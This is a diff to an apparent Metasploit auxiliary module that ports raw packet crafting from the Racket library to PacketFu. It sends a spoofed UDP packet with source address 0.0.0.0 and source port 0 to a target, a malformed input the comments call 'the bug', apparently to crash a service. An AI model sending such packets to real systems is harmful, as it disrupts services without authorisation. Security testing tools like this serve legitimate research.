@@ -10,7 +10,6 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -45,22 +44,15 @@ class Metasploit3 < Msf::Auxiliary
 
 		open_pcap
 
-		n = Racket::Racket.new
-
-		n.l3 = Racket::L3::IPv4.new
-		n.l3.src_ip = '0.0.0.0'
-		n.l3.dst_ip = rhost
-		n.l3.protocol = 17
-		n.l3.id = 0xbeef
-		n.l3.ttl = 128
-		n.l3.flags = 2
-
-		n.l4 = Racket::L4::UDP.new
-		n.l4.src_port = 0
-		n.l4.dst_port = datastore['RPORT'].to_i
-		pkt = n.pack
-
-		capture_sendto(pkt, rhost)
+		p = PacketFu::UDPPacket.new
+		p.ip_saddr = "0.0.0.0"
+		p.ip_daddr = rhost
+		p.ip_frag = 0x4000 # Original had ip frag flags set to 2 for some reason.
+		p.udp_sport = 0 # That's the bug
+		p.udp_dport = datastore['RPORT'].to_i
+		p.payload = Rex::Text.rand_text(rand(0x20)) # UDP needs at least one data byte, may as well send a few.
+		p.recalc
+		capture_sendto(p, rhost)
 
 		close_pcap
 
